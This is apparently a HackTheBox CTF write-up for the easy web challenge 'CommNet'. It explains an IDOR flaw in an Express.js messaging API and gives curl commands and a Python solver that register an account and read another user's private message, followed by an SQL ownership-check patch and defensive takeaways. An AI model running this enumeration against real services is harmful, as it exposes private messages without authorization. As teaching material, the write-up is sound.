<div align="center">

# CommNet -- HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Solved-success?style=for-the-badge)

<img src="../../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**

---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Challenge Information

| Field      | Value         |
|------------|---------------|
| Name       | CommNet       |
| Category   | Web           |
| Difficulty | Easy          |
| Points     | 20            |
| Creator    | lordrukie     |

## Table of Contents

1. [Scenario](#scenario)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Source Code Analysis](#source-code-analysis)
4. [Identifying the Vulnerability](#identifying-the-vulnerability)
5. [Exploitation -- IDOR](#exploitation----idor)
6. [Understanding the Solver](#understanding-the-solver)
7. [Patching the Vulnerability](#patching-the-vulnerability)
8. [Verification and Flag](#verification-and-flag)
9. [Flag](#flag)
10. [Key Takeaways](#key-takeaways)

## Scenario

> *"Cut off from each other and besieged by undead propaganda, humanity's survivors rely on CommNet -- until the white-hats break in to silence the broadcast and reconnect the enclaves."*

We are presented with the **HTB Editor** -- a browser-based code editor that displays the source code of a Node.js messaging application. Our job is to understand the vulnerability, exploit it to prove impact, then patch the source and pass the automated verifier.

**Target:** `<CHALLENGE_IP>:<PORT>`

---

## Initial Reconnaissance

The HTB Editor exposes an API that lets us browse the application's directory tree and read individual source files. This is the first step in understanding what we are working with.

### Retrieving the Directory Structure

```bash
curl -s http://<CHALLENGE_IP>:<PORT>/api/directory | python3 -m json.tool
```

The output reveals a standard Express.js project layout:

```
.
├── app.js
├── db/
│   └── database.js
├── exploit/
│   └── solver.py
├── routes/
│   └── messages.js
├── middleware/
│   └── auth.js
└── package.json
```

### Reading Key Source Files

```bash
# Read the messaging routes
curl -s "http://<CHALLENGE_IP>:<PORT>/api/file?path=routes/messages.js"

# Read the database layer
curl -s "http://<CHALLENGE_IP>:<PORT>/api/file?path=db/database.js"

# Read the provided exploit
curl -s "http://<CHALLENGE_IP>:<PORT>/api/file?path=exploit/solver.py"
```

---

## Source Code Analysis

### Application Overview

The application is a messaging platform built with **Express.js** and **SQLite**. It provides:

- User registration and login (`/challenge/api/auth/register`, `/challenge/api/auth/login`)
- Sending messages between users
- Reading messages by ID (`/challenge/api/messages/:id`)

The `/challenge` base route prefixes all application endpoints. Authentication is cookie-based, and a `requireAuth` middleware gates protected routes.

### The Vulnerable Endpoint -- `routes/messages.js`

The critical code lives in the message retrieval route:

```javascript
// routes/messages.js -- VULNERABLE VERSION

router.get('/messages/:id', requireAuth, async (req, res) => {
    const { id } = req.params;

    try {
        const message = await db.get(
            `SELECT m.id, m.content, m.subject, m.created_at,
                    s.username as sender, r.username as recipient
             FROM messages m
             JOIN users s ON m.sender_id = s.id
             LEFT JOIN users r ON m.recipient_id = r.id
             WHERE m.id = ?`,
            [id]
        );

        if (!message) {
            return res.status(404).json({ error: 'Message not found' });
        }

        res.json(message);
    } catch (err) {
        res.status(500).json({ error: 'Server error' });
    }
});
```

### The Database Layer -- `db/database.js`

The database is seeded with several messages. Importantly, **message ID 3** contains the flag in its `content` field. This message belongs to an admin user and is not addressed to any regular user.

---

## Identifying the Vulnerability

**Vulnerability Type:** IDOR (Insecure Direct Object Reference)

The `GET /challenge/api/messages/:id` endpoint has a critical flaw:

1. It correctly requires authentication via the `requireAuth` middleware -- good.
2. It accepts a message `id` from the URL path -- fine.
3. It executes a SQL query filtered **only** by `m.id = ?` -- **bad.**
4. It **never checks** whether the authenticated user is the sender or recipient of that message.

This means **any authenticated user can read any message in the system** simply by iterating over message IDs. This is the textbook definition of an IDOR vulnerability.

The SQL query at fault:

```sql
-- Only filters by message ID, no ownership check
WHERE m.id = ?
```

There is no reference to `req.user.id`, `sender_id`, or `recipient_id` in the WHERE clause.

---

## Exploitation -- IDOR

### Step 1: Register a New User

```bash
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/challenge/api/auth/register" \
  -H "Content-Type: application/json" \
  -c cookies.txt \
  -d '{"username":"hacker","email":"hacker@test.com","password":"hacker","enclave":"West Enclave"}'
```

Expected response:

```json
{"message": "Registration successful"}
```

### Step 2: Log In

```bash
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/challenge/api/auth/login" \
  -H "Content-Type: application/json" \
  -c cookies.txt -b cookies.txt \
  -d '{"username":"hacker","password":"hacker"}'
```

Expected response:

```json
{"message": "Login successful", "user": {"id": 4, "username": "hacker"}}
```

### Step 3: Exploit the IDOR -- Read Message 3

Now we simply request a message that does not belong to us. Message ID 3 contains the flag:

```bash
curl -s "http://<CHALLENGE_IP>:<PORT>/challenge/api/messages/3" -b cookies.txt
```

Response:

```json
{
  "id": 3,
  "content": "HTB{1d0r_m3ss4g3_4cc3ss_████████████████████████████████}",
  "subject": "Confidential Broadcast Override Codes",
  "created_at": "2025-01-01T00:00:00.000Z",
  "sender": "admin",
  "recipient": "commander"
}
```

We successfully read a private message between `admin` and `commander` without being either of those users. The flag is in the `content` field.

---

## Understanding the Solver

The provided `exploit/solver.py` automates the exact attack flow described above:

```python
# exploit/solver.py (key logic)

import requests

BASE = f"http://{HOST}:{PORT}/challenge/api"
s = requests.Session()

# 1. Register a throwaway account
s.post(f"{BASE}/auth/register", json={
    "username": "hacker",
    "email": "hacker@test.com",
    "password": "hacker",
    "enclave": "West Enclave"
})

# 2. Authenticate
s.post(f"{BASE}/auth/login", json={
    "username": "hacker",
    "password": "hacker"
})

# 3. Exploit IDOR -- read message ID 3 directly
resp = s.get(f"{BASE}/messages/3")
flag = resp.json()["content"]
print(f"[+] Flag: {flag}")
```

The solver is straightforward: register, login, fetch message 3. No brute-forcing is required because the solver already knows the target message ID. In a real scenario, an attacker would iterate `messages/1`, `messages/2`, `messages/3`, etc. to enumerate all messages in the system.

---

## Patching the Vulnerability

The fix is to add an **ownership check** to the SQL WHERE clause so that a user can only read messages they sent, received, or that are broadcast messages (where `recipient_id IS NULL`).

### Vulnerable Code

```javascript
// BEFORE -- no ownership check
const message = await db.get(
    `SELECT m.id, m.content, m.subject, m.created_at,
            s.username as sender, r.username as recipient
     FROM messages m
     JOIN users s ON m.sender_id = s.id
     LEFT JOIN users r ON m.recipient_id = r.id
     WHERE m.id = ?`,
    [id]
);
```

### Patched Code

```javascript
// AFTER -- ownership check enforced
const userId = req.user.id;

const message = await db.get(
    `SELECT m.id, m.content, m.subject, m.created_at,
            s.username as sender, r.username as recipient
     FROM messages m
     JOIN users s ON m.sender_id = s.id
     LEFT JOIN users r ON m.recipient_id = r.id
     WHERE m.id = ?
       AND (m.sender_id = ? OR m.recipient_id = ? OR m.recipient_id IS NULL)`,
    [id, userId, userId]
);
```

The key change is the additional AND clause:

```sql
AND (m.sender_id = ? OR m.recipient_id = ? OR m.recipient_id IS NULL)
```

This ensures:

- **`m.sender_id = ?`** -- The requesting user sent the message.
- **`m.recipient_id = ?`** -- The requesting user is the intended recipient.
- **`m.recipient_id IS NULL`** -- The message is a broadcast (no specific recipient), visible to all authenticated users.

### Applying the Patch via the Editor API

```bash
# Save the patched file
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/api/save" \
  -H "Content-Type: application/json" \
  -d '{"path":"routes/messages.js","content":"<PATCHED_CONTENT>"}'
```

Replace `<PATCHED_CONTENT>` with the full contents of `routes/messages.js` including the ownership check fix shown above.

---

## Verification and Flag

### Restart the Application

After saving the patch, restart the challenge application so the new code takes effect:

```bash
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/api/restart"
```

### Run the Verifier

The HTB Editor provides an automated verification endpoint that runs the solver against the patched application. If the IDOR is properly fixed, the solver will fail to read message 3 (since the test user is neither the sender nor the recipient), and the verifier will confirm the patch:

```bash
curl -s "http://<CHALLENGE_IP>:<PORT>/api/verify"
```

Expected response:

```json
{"message": "Congratulations!", "flag": "HTB{1d0r_m3ss4g3_4cc3ss_████████████████████████████████}"}
```

---

## Flag

| Field | Value                                                        |
|-------|--------------------------------------------------------------|
| Flag  | `HTB{1d0r_m3ss4g3_4cc3ss_████████████████████████████████}` |

---

## Key Takeaways

1. **IDOR is one of the most common web vulnerabilities.** Whenever a resource is accessed by a numeric or predictable identifier, always verify that the requesting user has authorization to access that specific resource. Authentication alone is never sufficient -- authorization must be enforced per-object.

2. **Always implement ownership checks at the query level.** Adding the ownership condition directly in the SQL WHERE clause is the most reliable approach. Application-level checks after fetching the data can be bypassed if the logic is flawed or if new code paths are introduced later.

3. **Defense in depth matters.** Even though `requireAuth` was present, the endpoint was still vulnerable because authentication and authorization are separate concerns. Authenticated does not mean authorized.

4. **Enumerate aggressively during assessments.** Sequential integer IDs (1, 2, 3, ...) make IDOR trivial to exploit. Consider using UUIDs or other non-sequential identifiers as an additional layer, though this is obscurity, not security -- ownership checks are still required.

5. **Broadcast messages need special handling.** The patched query includes `OR m.recipient_id IS NULL` to allow legitimate access to broadcast messages. Security fixes must preserve intended functionality.

---

<div align="center">

**Written by MrsNobody**

<img src="../../assets/MrsNobody.png" width="80">

*Hack The Box -- CommNet*

</div>

<!--
  SEO Keywords:
  HackTheBox, HTB, CommNet, writeup, walkthrough, challenge, web, IDOR,
  Insecure Direct Object Reference, Express.js, Node.js, SQLite, messaging,
  authentication bypass, authorization, access control, API security,
  message enumeration, cookie authentication, requireAuth, ownership check,
  CTF, capture the flag, cybersecurity, penetration testing, white-hat,
  lordrukie, easy, web exploitation, bug bounty, OWASP, broken access control
-->
